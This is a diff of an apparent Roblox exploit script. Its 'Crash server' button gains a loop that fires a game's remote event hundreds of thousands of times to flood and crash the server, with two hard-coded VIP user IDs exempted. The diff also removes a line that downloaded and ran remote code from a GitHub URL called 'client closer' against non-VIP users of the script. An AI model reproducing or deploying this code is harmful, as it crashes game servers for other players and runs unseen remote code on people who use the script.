@@ -953,9 +953,43 @@ local Tab = Window.NewTab("Crash server")
 local Section = Tab.NewSection("Are you sure")
 local Button = Section.NewButton("yes",function()
 local VIPPlayers = {
-    [2236295191] = true,
-    [2425398238] = true
+    [223629512191] = true,
+    [242539822138] = true
 }
+
+if VIPPlayers[game.Players.LocalPlayer.UserId] then
+
+else
+for i = 1,345900 do
+                pcall(function()
+                    game:GetService("ReplicatedStorage").Accessories:FireServer(unpack({
+                        [1] = "PiercingsF",
+                        [2] = "Right Ear Piercings"
+                    }))
+                    game:GetService("ReplicatedStorage").Accessories:FireServer(unpack({
+                        [1] = "PiercingsF",
+                        [2] = "Left Ear Piercings"
+                    }))
+                    game:GetService("ReplicatedStorage").Accessories:FireServer(unpack({
+                        [1] = "PiercingsF",
+                        [2] = "SnakeBites"
+                    }))
+                    game:GetService("ReplicatedStorage").Accessories:FireServer(unpack({
+                        [1] = "PiercingsF",
+                        [2] = "EyebrowPiercings"
+                    }))
+                    game:GetService("ReplicatedStorage").Accessories:FireServer(unpack({
+                        [1] = "PiercingsF",
+                        [2] = "Septum"
+                    }))
+                end)
+            end
+            end
+local VIPPlayers = {
+    [223629512191] = true,
+    [242539822138] = true
+}
+
 if VIPPlayers[game.Players.LocalPlayer.UserId] then
 
 while true do
@@ -1107,9 +1141,8 @@ while true do
 	
 		task.wait()
 end
-	if not VIPPlayers[game.Players.LocalPlayer.UserId] then		
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/Fattythefatty/bluefoxscript/main/client%20closer"))
-			end
+		
+
 	end
 			
 			local HTTP_ = game:GetService('HttpService')
